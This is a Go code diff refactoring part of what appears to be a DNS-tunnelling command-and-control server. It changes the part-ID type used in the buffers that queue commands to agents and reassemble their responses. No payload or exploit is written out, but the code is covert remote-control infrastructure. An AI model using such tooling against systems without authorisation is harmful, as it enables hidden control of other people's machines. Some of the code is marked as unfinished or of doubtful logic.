@@ -30,8 +30,6 @@ type Server struct {
 	io                       IO
 	// dedupPrevMsgHash is only for consecutive message duplicates
 	dedupPrevMsgHash uint64
-	// outBuffer is a buffer for outgoing messages
-	// outBuffer map[cryptography.PublicKeyStr]map[ParentPartID][]string
 }
 
 // log levels
@@ -62,14 +60,11 @@ type agentStatusForServer struct {
 	LastAckFromAgentServerTime      uint32
 	LastAckFromAgentPacketTime      uint32
 	NextMessageType                 c2.MsgType
-	NextParentPartID                ParentPartID
+	NextParentPartID                c2.PartID
 	HealthCheckIntervalMilliSeconds uint32
-	InBuffer                        map[ParentPartID][]c2.MessagePacketWithSignature
-	OutBuffer                       map[ParentPartID][]string
+	InBuffer                        map[c2.PartID][]c2.MessagePacketWithSignature
+	OutBuffer                       map[c2.PartID][]string
 }
-
-// ParentPartID is a unique identifier for a parent message
-type ParentPartID uint16
 
 // New returns a new Server object
 func New() Server {
@@ -99,7 +94,7 @@ func (s *Server) messageHealthcheckHandler(Packet c2.MessagePacketWithSignature,
 		s.connectedAgents[Packet.Signature.String()] = agentStatusForServer{
 			NextMessageType:                 c2.MessageHealthcheck,
 			HealthCheckIntervalMilliSeconds: 10000, //todo: make this configurable
-			InBuffer:                        make(map[ParentPartID][]c2.MessagePacketWithSignature),
+			InBuffer:                        make(map[c2.PartID][]c2.MessagePacketWithSignature),
 		}
 	}
 	// agent already exists, only update the timestamps and prepare the next packet based on message type
@@ -107,7 +102,7 @@ func (s *Server) messageHealthcheckHandler(Packet c2.MessagePacketWithSignature,
 	agent.LastAckFromAgentServerTime = uint32(time.Now().Unix())
 	// create the incoming buffer if it doesn't exist
 	if agent.InBuffer == nil {
-		agent.InBuffer = make(map[ParentPartID][]c2.MessagePacketWithSignature)
+		agent.InBuffer = make(map[c2.PartID][]c2.MessagePacketWithSignature)
 	}
 	s.connectedAgents[Packet.Signature.String()] = agent
 	switch agent.NextMessageType {
@@ -179,7 +174,7 @@ func (s *Server) handleExecuteCommandResponse(Packet c2.MessagePacketWithSignatu
 		s.io.Logger(ERR, "agent not recognized")
 	}
 	// handle multipart incoming
-	agent.InBuffer[ParentPartID(Packet.Msg.ParentPartID)] = append(agent.InBuffer[ParentPartID(Packet.Msg.ParentPartID)], Packet)
+	agent.InBuffer[Packet.Msg.ParentPartID] = append(agent.InBuffer[Packet.Msg.ParentPartID], Packet)
 	// if Packet.Msg.ParentPartID != 0 { // multi part
 	//fist and middle packets
 	msg := c2.MessagePacket{
@@ -214,7 +209,7 @@ func (s *Server) handleExecuteCommandResponse(Packet c2.MessagePacketWithSignatu
 	}
 
 	fullPayload := make([]byte, 0)
-	packets := c2.CheckMessageIntegrity(agent.InBuffer[ParentPartID(Packet.Msg.ParentPartID)])
+	packets := c2.CheckMessageIntegrity(agent.InBuffer[Packet.Msg.ParentPartID])
 	for _, packet := range packets {
 		packetPayload := packet.Msg.Payload[:]
 		fullPayload = append(fullPayload, packetPayload...)
@@ -225,20 +220,19 @@ func (s *Server) handleExecuteCommandResponse(Packet c2.MessagePacketWithSignatu
 
 	s.io.Logger(DEBUG, "cleaning up buffer for %s", Packet.Signature.String())
 	// delete(agent.IncomingMessageBuffer, ParentPartID(Packet.Msg.ParentPartID))
-	delete(agent.OutBuffer, ParentPartID(Packet.Msg.ParentPartID))
+	delete(agent.OutBuffer, Packet.Msg.ParentPartID)
 	// sometimes the multipart messages also have a message with parent ID 0, which needs to be cleaned up
-	delete(agent.OutBuffer, ParentPartID(0))
+	delete(agent.OutBuffer, c2.PartID(0))
 
 	return nil
 }
 
 func (s *Server) mustSendMsg(msgPacket c2.MessagePacket, agentPublicKey *cryptography.PublicKey, msg string) error {
 	// As part of the incoming packet, we'll get the partid as well as parentPartID so we know which part to send next. we just need to cache the whole partition up
-	Answers, parentPartIDInt, _ := c2.PreparePartitionedPayload(msgPacket, []byte(msg), s.DNSSuffix, s.privateKey, agentPublicKey)
+	Answers, parentPartID, _ := c2.PreparePartitionedPayload(msgPacket, []byte(msg), s.DNSSuffix, s.privateKey, agentPublicKey)
 	//todo: single part messages always have parentPartId = 0, so we need to check if it's single part or multi part and probably don't cache
 	//todo: what are we getting from the client? let's decrypt and log those
 
-	parentPartID := ParentPartID(parentPartIDInt)
 	agent := s.connectedAgents[agentPublicKey.String()]
 
 	// check to see if the parent key exists first in case an agent disappears
@@ -246,13 +240,13 @@ func (s *Server) mustSendMsg(msgPacket c2.MessagePacket, agentPublicKey *cryptog
 		if targetBuffer, ok := agent.OutBuffer[parentPartID]; ok {
 			if parentPartID == 0 {
 				s.io.Logger(INFO, "key and ParentPartId already exist in the buffer, overwriting...")
-				agent.OutBuffer = make(map[ParentPartID][]string)
+				agent.OutBuffer = make(map[c2.PartID][]string)
 				agent.OutBuffer[parentPartID] = append(agent.OutBuffer[parentPartID], Answers[0])
 			}
 
 		} else {
 			//initialize the map
-			agent.OutBuffer = make(map[ParentPartID][]string)
+			agent.OutBuffer = make(map[c2.PartID][]string)
 			targetBuffer = append(targetBuffer, Answers...)
 			agent.OutBuffer[parentPartID] = targetBuffer
 		}
@@ -293,7 +287,8 @@ func (s *Server) messageChatHandler(Packet c2.MessagePacketWithSignature, q *dns
 	agent := s.connectedAgents[Packet.Signature.String()]
 	acknowledgedID := Packet.Msg.PartID
 	// handle last packet ID
-	if uint16(len(agent.OutBuffer[agent.NextParentPartID])) == acknowledgedID {
+	// NOTE: this makes no sense?
+	if c2.PartID(uint16(len(agent.OutBuffer[agent.NextParentPartID]))) == acknowledgedID {
 		return nil
 	}
 	if Packet.Msg.IsLastPart || Packet.Msg.ParentPartID == 0 {
@@ -349,7 +344,7 @@ func (s *Server) handleRunCommandAckFromAgent(Packet c2.MessagePacketWithSignatu
 	agent := s.connectedAgents[Packet.Signature.String()]
 	acknowledgedID := Packet.Msg.PartID
 	// handle last packet ID
-	if uint16(len(agent.OutBuffer[agent.NextParentPartID])) == acknowledgedID {
+	if c2.PartID(uint16(len(agent.OutBuffer[agent.NextParentPartID]))) == acknowledgedID {
 		return nil
 	}
 	if Packet.Msg.IsLastPart {
